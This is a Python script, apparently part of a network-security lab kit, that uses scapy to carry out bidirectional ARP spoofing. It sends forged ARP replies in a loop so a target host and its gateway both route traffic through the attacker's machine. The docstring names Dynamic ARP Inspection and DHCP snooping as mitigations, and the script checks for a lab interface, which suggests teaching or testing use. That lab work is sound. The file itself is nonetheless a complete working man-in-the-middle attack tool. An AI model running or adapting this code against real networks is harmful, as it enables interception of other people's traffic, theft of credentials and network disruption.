#!/usr/bin/env python3
"""L2 SPOOFING: bidirectional ARP poison (MITM) between a target and the
gateway. Mitigation: Dynamic ARP Inspection + DHCP snooping (see README)."""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import base_parser, enforce_lab_iface, require_scapy, status, run_loop, selftest_ok, iface_mac  # noqa: E402


def build_poison(scapy_all, spoof_ip, real_ip, src_mac, dst_mac=None):
    ARP, Ether = scapy_all.ARP, scapy_all.Ether
    # The poison's whole point: bind the impersonated IP (psrc) to the ATTACKER's
    # MAC (hwsrc) so the victim caches spoof_ip -> attacker and routes through us
    # (MITM). Without hwsrc set, scapy's auto-resolution fails here and the reply
    # egresses "is-at 00:00:00:00:00:00" — an inert poison that only blackholes.
    # op=2 (is-at / reply), psrc = impersonated IP, pdst = victim IP.
    pkt = ARP(op=2, hwsrc=src_mac, psrc=spoof_ip, pdst=real_ip)
    # A valid (non-zero) L2 source is also required or the PNetLab link bridge
    # drops the frame before it reaches the victim — see common.iface_mac().
    if dst_mac:
        pkt.hwdst = dst_mac
        return Ether(src=src_mac, dst=dst_mac) / pkt
    return Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") / pkt


def main():
    p = base_parser("Bidirectional ARP spoof / MITM between target and gateway")
    p.add_argument("--target_ip", default="", help="victim host IP")
    p.add_argument("--gateway_ip", default="", help="gateway IP")
    args = p.parse_args()
    enforce_lab_iface(args.iface)
    require_scapy()
    import scapy.all as scapy_all

    src = iface_mac(args.iface)
    if args.selftest:
        pkt = build_poison(scapy_all, "192.168.1.1", "192.168.1.10", src)
        selftest_ok("arp_spoof", "forged ARP reply len=%d" % len(bytes(pkt)))
        return

    if not args.target_ip or not args.gateway_ip:
        status("FATAL", "--target_ip and --gateway_ip are both required")
        sys.exit(1)

    def poison(n):
        # Tell the target "I am the gateway", and the gateway "I am the target".
        scapy_all.sendp(build_poison(scapy_all, args.gateway_ip, args.target_ip, src), iface=args.iface, verbose=0)
        scapy_all.sendp(build_poison(scapy_all, args.target_ip, args.gateway_ip, src), iface=args.iface, verbose=0)
        status("SENT", "poison round #%d: %s<-(fake gw), %s<-(fake target)" %
               (n + 1, args.target_ip, args.gateway_ip))

    run_loop(args.count, args.interval, poison)


if __name__ == "__main__":
    main()

